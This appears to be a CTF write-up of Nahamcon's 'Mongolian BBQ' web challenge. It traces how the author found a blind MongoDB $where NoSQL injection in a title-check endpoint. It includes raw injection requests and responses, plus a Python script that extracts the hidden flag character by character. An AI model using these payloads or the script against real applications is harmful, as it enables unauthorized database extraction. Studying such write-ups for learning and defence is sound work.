---
title:  "Nahamcon CTF - Mongolian BBQ"
date:   2020-06-18 02:01:25 +0100
categories: ctf
published: true
---

Playing [Nahamcon CTF](https://ctf.nahamcon.com/) was really fun, and I managed to solve all but three web challenges (as well as some challenges from other categories), which was pretty motivating. "Mongolian BBQ" was one of the challenges which I did not manage to solve during the CTF, but I really was curious about the solution and not ready to just give up after the CTF was over. Luckily, the infrastructure was (and currently is) still up. I finally managed to solve this challenge using a hint posted on the Nahamcon Discord channel after the CTF was over, which gave me the missing piece of information that I needed. As I could not find a complete writeup for that challenge up to yesterday and wanted to write down the methodology I used to successfully exploit this challenge anyway, I decided to publish one myself.

---

The challenge title hinted that we need to perform a MongoDB NoSQL injection to get hold of the flag:

{% include image-center.html url="/assets/mongolianbbq/challenge.png" alt="Challenge Description" %}


The links from the challenge description (there were multiple instances in case one breaks during the CTF) pointed to a website with post about recipes that were categorized into "Breakfast", "Lunch" etc. The logged out area seemed to only allow reading those recipes and searching for recipes. A comment section was displayed below each post, but the "submit" button was non-functional. However, below some recipes, there were existing comments. I noticed that the comments seem to all come from `Thomas` and `Admin`. Unfortunately, I did not pay too much attention to the content of the commens - huge mistake, but more to that later.

Next, I took a look at the login functionality. It was not possible to login with standard usernames (I just manually tried out a few), but there was a possibility to register new users. 

After registering a user and replaying that request, the following error message showed up, another hint towards NoSQL injection. 

{% include image-center.html url="/assets/mongolianbbq/register_dupkey.png" alt="Register error" %}

A quick google search confirmed that the database was probably MongoDB. Nice - but the vulnerable endpoint needed to still be found. The register and login endpoints seemed not to be vulnerable, except of the verbose error message there was nothing to find there.

I shortly analyzed the JWT token that was set as a cookie after logging in because there were many other challenges where the token was vulnerable to some sort of exploit. However, the token did not seem to be obviously vulnerable. After unsuccessfully trying to bypass authentication with the `None` algorithm and some NoSQL payloads in the username (which did not work at all because of course they destroyed the signature) I was pretty sure that the token was not the thing that should be attacked in this case.

Next, I visited the logged-in area, which, to my surprise, seemed to have the very same functionality than the logged-out area. Weird... 

During the CTF I tried my best to inject NoSQL payloads into the recipe search `/?search=[recipe title]` and the category filter `/?category=[category]`, but I wasn't able to exploit those endpoints either. 

During my tries, I made note of the available categories:

* Breakfast
* Lunch
* Beverages
* Appetizers
* Soups
* Salads

...and the post titles:

* BBQ ribs
* Lasagne
* Fajitas
* Falafels
* Couscous salad
* Avocado salad

After trying several payloads and coming to the conclusion that I got stuck with no further options, I focused on other challenges.

Two days after the CTF, I was still scratching my head about this challenge. I do not have much experience with exploiting NoSQL injection but I thought that this challenge should not be impossible to solve putting in some effort, or at least I should be able to find an exploitable endpoint after all...

After another round of trying to throw all kind of NoSQL (and SQL) injection payloads at all endpoints I knew of and not making a single step further towards the initial foothold, I was pretty desperate, but still determined to solve that challenge - or to at least find out how it can be solved. I could still not find any writeups on CTFTime for this challenge. However, after looking through the posts in the nahmconctf Discord channel, I found the following comment that gave me the hint I needed to proceed - I'm so grateful that this comment got posted!

{% include image-center.html url="/assets/mongolianbbq/discord-hint.png" alt="Challenge comment" %}

Well, the NoSQL injection part wasn't big news for me, but the `/create` endpoint?? 

{% include image-center.html url="/assets/mongolianbbq/create_ajax.png" alt="Create" %}

Oh well, I felt so stupid and at the same time excited because there was a way out of being stuck.

Trying to submit a post fails with the error message `Only the administrator can create posts`. However, I noticed that there must be some ajax magic going on in the background because a check whether the selected title is available was updating immediately after entering a title an switching focus to other inputs. Indeed, there was a GET request to `/api/check_title?title=[title]` going on the background. 

The response seemed to contain the count of matching titles. When searching for random titles that did not belong to any existing posts, the response was `0`:

```html
GET /api/check_title?title=x HTTP/1.1
Host: one.jh2i.com:50009
Connection: close


HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 1
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Wed, 17 Jun 2020 22:31:08 GMT

0
```

However, when searching for titles that already exist, the response was `1`:

```html
GET /api/check_title?title=Lasagne HTTP/1.1
Host: one.jh2i.com:50009
Connection: close

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 1
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Wed, 17 Jun 2020 22:21:29 GMT

1
```

Next, I tried a standard payload for MongoDB injection in `$where` (following the Discord post hint), which immediately confirmed that this endpoint was vulnerable to NoSQL injection: `x' || '1'=='1` resulted in `7`, while `x' || '1'=='0` resulted in `0` in the response. As I could only find 6 posts in all categories, it seemed like there was one post that is not visible. Actually, the following comment below the `BBQ Ribs` recipe should have told me that there is a hidden post.

{% include image-center.html url="/assets/mongolianbbq/secret-sauce.png" alt="Comment" %}

I was pretty sure that the flag will be either in the title or the body. As there is no direct response, we have boolean-based blind NoSQL injection, giving us no direct output. This also means that is not sufficient to use simple comparisons which is the easiest thing to inject into `$where`, instead, some sort of regex or substring search is needed to efficiently retrieve the flag character by character.

Next, I tried to find out how to properly end the query to be able to inject more advanced things. First, I just added a comment after the semicolon. Luckily, the error messages returned were quite verbose:

```html
GET /api/check_title?title=Lasagne'// HTTP/1.1
Host: one.jh2i.com:50009
Connection: close


HTTP/1.0 400 BAD REQUEST
Content-Type: text/html; charset=utf-8
Content-Length: 169
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Wed, 17 Jun 2020 22:23:58 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>400 Bad Request</title>
<h1>Bad Request</h1>
<p>SyntaxError: missing } after function body @:1:50<br></p>
```

Next, I obviously tried to add a `}`:

```html
GET /api/check_title?title=Lasagne'}// HTTP/1.1
Host: one.jh2i.com:50009
Connection: close


HTTP/1.0 400 BAD REQUEST
Content-Type: text/html; charset=utf-8
Content-Length: 137
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Wed, 17 Jun 2020 22:25:32 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>400 Bad Request</title>
<h1>Bad Request</h1>
<p>Failed to call method</p>
```

Oh well, this one was a bit harder to solve. After playing around a bit I found out that I can return something:

```html
GET /api/check_title?title=Lasagne'%3b+return+true%3b}// HTTP/1.1
Host: one.jh2i.com:50009
Connection: close


HTTP/1.0 400 BAD REQUEST
Content-Type: text/html; charset=utf-8
Content-Length: 166
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Wed, 17 Jun 2020 22:25:42 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>400 Bad Request</title>
<h1>Bad Request</h1>
<p>SyntaxError: missing ) in parenthetical @:1:58<br></p>
```

Still errors, but at least a different one that is easy to fix and finally the query worked again:

```html
GET /api/check_title?title=Lasagne'%3b+return+true%3b})// HTTP/1.1
Host: one.jh2i.com:50009
Connection: close


HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 1
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Wed, 17 Jun 2020 22:25:56 GMT

7
```

Next, I tried to find out if I can access different properties of the current object, which `$where` performs the check on. If a property is present, calling `.x` on that property (which results in `undefined` I guess) to arbitrary values simply returns `0`:

```html
GET /api/check_title?title=x'+||+this.title.x=='whatever HTTP/1.1
Host: one.jh2i.com:50009
Connection: close


HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 1
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Wed, 17 Jun 2020 22:30:21 GMT

0
```

However, calling `.x` on non-existing properties throws an error:

```html
GET /api/check_title?title=testtitle'+||+this.foo.x=='bar HTTP/1.1
Host: one.jh2i.com:50009
Connection: close


HTTP/1.0 400 BAD REQUEST
Content-Type: text/html; charset=utf-8
Content-Length: 164
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Wed, 17 Jun 2020 22:22:17 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>400 Bad Request</title>
<h1>Bad Request</h1>
<p>TypeError: this.foo is undefined :<br>@:1:15<br></p>
```

Using this trick, I found out that (at least) the following properties exist on `this`: 

* `title`
* `category`
* `author`
* `content`

Assuming the title contains the flag, I only need to find a way to test for regexes or substrings on that property. After a bit of guessing I found out that I can use `startswith` on strings. Combining that with the knowledge how to end a query gave me the following request that can be used as oracle:

```html
GET /api/check_title?title=x'%3b+return+this.title.startsWith('L')%3b})// HTTP/1.1
Host: one.jh2i.com:50009
Connection: close


HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 1
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Wed, 17 Jun 2020 22:29:32 GMT

1
```

I wrote the a small Python script that retrieves the flag character by character:

```python
import requests
import string

RHOST = "one.jh2i.com"
RPORT = 50009

PROXIES = {}
# PROXIES = { "http": "http://127.0.0.1:8080" }

def test(payload):
    url = f"http://{RHOST}:{RPORT}/api/check_title"
    params = { "title": "Lasagne'; return this.title.startsWith('" + payload + "')});//" }
    res = requests.get(url, params=params, proxies=PROXIES)
    return res.text.strip() != "0"


if __name__ == "__main__":
    result = ""
    found = True
    while found:
        found = False
        for char in string.ascii_letters + string.digits + "{}_":
            if test(result + char):
                print(f"[+] {result}{char}")
                result += char
                found = True
                break
```

Executing the script finally revealed the flag (I was lucky that lowercase letter were before uppercase letters and that the hidden recipe was the only one starting with a lowercase letter, otherwise I would have needed to adjust the script a bit):

```default
$ python3 exploit.py 
[+] f
[+] fl
[+] fla
[+] flag
[+] flag{
[+] flag{m
[+] flag{mo
[+] flag{mon
[+] flag{mong
[+] flag{mongo
[+] flag{mongod
[+] flag{mongodb
[+] flag{mongodb_
[+] flag{mongodb_o
[+] flag{mongodb_oh
[+] flag{mongodb_oh_
[+] flag{mongodb_oh_n
[+] flag{mongodb_oh_no
[+] flag{mongodb_oh_noo
[+] flag{mongodb_oh_nooo
[+] flag{mongodb_oh_noooo
[+] flag{mongodb_oh_noooo_
[+] flag{mongodb_oh_noooo_s
[+] flag{mongodb_oh_noooo_sq
[+] flag{mongodb_oh_noooo_sql
[+] flag{mongodb_oh_noooo_sql}
```
